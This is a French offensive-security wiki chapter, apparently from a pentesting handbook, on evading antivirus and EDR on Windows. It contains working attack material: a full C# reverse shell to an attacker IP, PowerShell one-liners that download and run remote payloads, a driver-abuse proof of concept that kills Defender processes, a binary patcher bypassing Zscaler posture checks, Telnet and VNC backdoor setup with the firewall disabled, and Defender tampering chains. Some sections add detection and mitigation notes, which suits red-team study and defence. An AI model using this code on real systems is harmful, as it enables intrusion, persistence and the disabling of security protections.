- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur simple de code métamorphique pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code granulaire pour les langages pris en charge par LLVM, utilisant le ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions classiques en chaînes ROP, contrecarrant ainsi notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un Crypter PE .NET écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode, puis de les charger

## SmartScreen & MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement selon une approche fondée sur la réputation, ce qui signifie que les applications rarement téléchargées déclencheront SmartScreen, alertant ainsi l'utilisateur final et l'empêchant d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) portant le nom de Zone.Identifier, qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier d'un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Un moyen très efficace d'empêcher vos payloads d'obtenir le Mark of The Web consiste à les empaqueter dans un conteneur quelconque, comme un ISO. Cela se produit parce que le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie afin de contourner le Mark-of-the-Web.

Exemple d'utilisation :
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démonstration du contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO à l'aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation de Windows qui permet aux applications et aux composants système de **journaliser des événements**. Cependant, il peut également être utilisé par les produits de sécurité pour surveiller et détecter les activités malveillantes.

De la même manière qu'AMSI est désactivé (contourné), il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en user space retourne immédiatement sans journaliser aucun événement. Cela se fait en patchant la fonction en mémoire afin qu'elle retourne immédiatement, ce qui désactive efficacement la journalisation ETW pour ce processus.

Vous trouverez plus d'informations sur **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Réflexion d'assembly C#

Le chargement de binaires C# en mémoire est connu depuis assez longtemps et reste une très bonne méthode pour exécuter vos outils de post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher au disque, nous n'aurons qu'à nous préoccuper du patching d'AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d'exécuter directement des assemblies C# en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **créer un nouveau processus sacrifiable**, à injecter votre code malveillant de post-exploitation dans ce nouveau processus, à exécuter votre code malveillant, puis à terminer le nouveau processus une fois l'opération terminée. Cette méthode présente des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution a lieu **en dehors du processus de notre implant Beacon**. Cela signifie que si quelque chose se passe mal ou est détecté lors de notre action de post-exploitation, il existe une **probabilité bien plus élevée** que notre **implant survive.** L'inconvénient est que vous avez une **probabilité plus élevée** d'être détecté par les **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. Ainsi, vous pouvez éviter de devoir créer un nouveau processus et de le faire analyser par l'AV, mais l'inconvénient est que si quelque chose se passe mal lors de l'exécution de votre payload, la **probabilité de **perdre votre beacon** est bien plus élevée**, car celui-ci pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous souhaitez en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ainsi que leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des assemblies C# **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilisation d'autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant à l'aide d'autres langages en donnant à la machine compromise un accès **à l'environnement de l'interpréteur installé sur le partage SMB contrôlé par l'Attaquant**.

En autorisant l'accès aux binaires de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique que Defender analyse toujours les scripts, mais qu'en utilisant Go, Java, PHP, etc., nous avons **davantage de flexibilité pour contourner les signatures statiques**. Des tests avec des scripts de reverse shell aléatoires et non obfusqués dans ces langages se sont révélés concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le jeton d'accès ou un produit de sécurité tel qu'un EDR ou un AV**, afin d'en réduire les privilèges pour que le processus ne s'arrête pas, tout en lui retirant les permissions nécessaires pour vérifier les activités malveillantes.

Pour empêcher cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilisation de logiciels de confiance

### Chrome Remote Desktop

Comme décrit dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime, puis de l'utiliser pour en prendre le contrôle et maintenir la persistence :<sup>[[35]](#references)</sup>
1. Téléchargez-le depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis cliquez sur le fichier MSI pour Windows afin de télécharger le fichier MSI.
2. Exécutez silencieusement l'installeur sur la machine victime (les privilèges administrateur sont requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur suivant. L'assistant vous demandera alors de vous authentifier ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre fourni avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le paramètre pin, qui permet de définir le code PIN sans utiliser l'interface graphique).


## Evasion avancée

L'evasion est un sujet très complexe. Il faut parfois prendre en compte de nombreuses sources différentes de télémétrie au sein d'un seul système ; il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement auquel vous vous attaquez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), afin d'acquérir une première compréhension des techniques d'Evasion avancée.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

C'est également une excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender identifie comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui va **supprimer des parties du binaire** jusqu'à **déterminer quelle partie Defender** identifie comme malveillante et vous la séparer.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), avec un service web accessible sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en exécutant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (furtif) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas le setup)

**SUR L'HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **UltraVNC.ini** **nouvellement** créé sur la **victime**

#### **Connexion reverse**

L'**attaquant** doit **exécuter sur** son **hôte** le binaire `vncviewer.exe -listen 5900` afin d'être **prêt** à recevoir une **connexion VNC** reverse. Ensuite, sur la **victime** : démarrez le daemon winvnc avec `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour rester discret, vous ne devez pas faire certaines choses

- Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution, sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il est en cours d'exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s'ouvrira
- N'exécutez pas `winvnc -h` pour obtenir de l'aide, sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dans GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Démarrez maintenant le **lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# avec un compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d’obfuscators C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utilisation de Python pour créer des injectors, exemple :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Désactiver AV/EDR depuis le Kernel

Storm-2603 a utilisé un petit utilitaire console appelé **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer un ransomware. L’outil apporte son **propre driver vulnérable mais *signé*** et l’exploite pour exécuter des opérations privilégiées dans le kernel, que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points essentiels
1. **Driver signé** : le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est en réalité le driver légitimement signé `AToolsKrnl64.sys` du « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le driver possède une signature Microsoft valide, il se charge même lorsque le Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis le user land.
3. **IOCTLs exposés par le driver**
| Code IOCTL | Capacité                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier arbitraire du disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Minimal C proof-of-concept :
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Pourquoi cela fonctionne** : le BYOVD contourne entièrement les protections user-mode ; le code exécuté dans le kernel peut ouvrir des processus *protégés*, les terminer ou altérer des objets du kernel, indépendamment de PPL/PP, ELAM ou d’autres fonctionnalités de hardening.

Détection / Mitigation
•  Activer la vulnerable-driver block list de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveiller la création de nouveaux services *kernel* et générer une alerte lorsqu’un driver est chargé depuis un répertoire accessible en écriture à tous ou lorsqu’il n’est pas présent dans l’allow-list.
•  Surveiller les handles user-mode vers des objets device personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contourner les vérifications Posture de Zscaler Client Connector par patching du binaire sur disque

Le **Client Connector** de Zscaler applique localement des règles de device-posture et utilise Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un bypass complet possible :

1. L’évaluation de la posture se fait **entièrement côté client** (un booléen est envoyé au serveur).
2. Les endpoints RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **patchant quatre binaires signés sur le disque**, ces deux mécanismes peuvent être neutralisés :

| Binaire | Logique originale patchée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1`, donc chaque vérification est considérée comme conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | Mis en NOP ⇒ n’importe quel processus, même non signé, peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d’intégrité du tunnel | Court-circuitées |

Extrait minimal du patcher :
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers d’origine et redémarré la service stack :

* **Tous** les posture checks apparaissent en **vert/conformes**.
* Les binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (par ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès illimité au réseau interne défini par les policies Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signer/level afin que seuls les protected processes de niveau égal ou supérieur puissent se modifier mutuellement. En offensive, si vous pouvez légitimement lancer un binaire compatible PPL et contrôler ses arguments, vous pouvez transformer une fonctionnalité bénigne (par ex. la journalisation) en une write primitive limitée, adossée à PPL, contre les répertoires protégés utilisés par les solutions AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- Le fichier EXE cible (ainsi que toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un protection level compatible doit être demandé afin de correspondre au signer du binaire (par ex. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les anti-malware signers, `PROTECTION_LEVEL_WINDOWS` pour les Windows signers). Des levels incorrects entraîneront l’échec de la création.

Voir également une introduction plus générale à PP/PPL et à la protection de LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper : CreateProcessAsPPL (sélectionne le protection level et transmet les arguments à l’EXE cible) :
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre permettant d’écrire un fichier journal à un chemin spécifié par l’appelant.
- Lorsqu’il est lancé en tant que processus PPL, l’écriture du fichier s’effectue avec le support de PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez les chemins courts 8.3 pour cibler des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un launcher (par exemple, CreateProcessAsPPL).
2) Fournir l’argument de chemin du journal ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par exemple, Defender Platform). Utiliser les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l’AV pendant son exécution (par exemple, MsMpEng.exe), planifier l’écriture au démarrage, avant le lancement de l’AV, en installant un service auto-start qui s’exécute suffisamment tôt de manière fiable. Valider l’ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l’écriture prise en charge par PPL s’effectue avant que l’AV ne verrouille ses binaires, ce qui corrompt le fichier cible et empêche le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, uniquement son emplacement ; cette primitive convient à la corruption plutôt qu'à l'injection précise de contenu.
- Nécessite des privilèges d'administrateur local/SYSTEM pour installer/démarrer un service ainsi qu'une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus `ClipUp.exe` avec des arguments inhabituels, notamment lorsqu'ils sont lancés par des launchers non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Rechercher la création/modification de services précédant les échecs de démarrage de Defender.
- Monitoring de l'intégrité des fichiers sur les binaires/répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus utilisant des indicateurs de protected-process.
- Télémétrie ETW/EDR : rechercher les processus créés avec `CREATE_PROTECTED_PROCESS` et l'utilisation anormale d'un niveau PPL par des binaires non liés à l'AV.

Atténuations
- WDAC/Code Integrity : limiter les binaires signés pouvant s'exécuter en tant que PPL et les processus parents autorisés ; bloquer l'invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : limiter la création/modification de services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- Vérifier que la protection contre les altérations de Defender et les protections early-launch sont activées ; examiner les erreurs de démarrage indiquant une corruption de binaire.
- Envisager de désactiver la génération des noms courts 8.3 sur les volumes hébergeant les outils de sécurité si cela est compatible avec votre environnement (tester minutieusement).

## Tampering de Microsoft Defender via le détournement d'un symlink de dossier de version Platform

Windows Defender choisit la Platform depuis laquelle il s'exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée selon l'ordre lexicographique (par exemple, `4.18.25070.5-0`), puis démarre les processus du service Defender depuis celui-ci (en mettant à jour les chemins du service et du registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux directory reparse points (symlinks). Un administrateur peut exploiter ce comportement pour rediriger Defender vers un chemin contrôlé par l'attaquant et réaliser du DLL sideloading ou provoquer une interruption du service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer la machine ou de déclencher une nouvelle sélection de la Platform Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont nécessaires (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de Platform fait confiance aux entrées de répertoire et choisit la version la plus élevée selon l'ordre lexicographique sans vérifier que la cible se résout vers un chemin protégé/de confiance.

Étape par étape (exemple)
1) Préparer un clone accessible en écriture du dossier Platform actuel, par exemple `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un lien symbolique de répertoire avec une version supérieure dans Platform, pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` ainsi que la configuration du service et le registre reflétant cet emplacement.

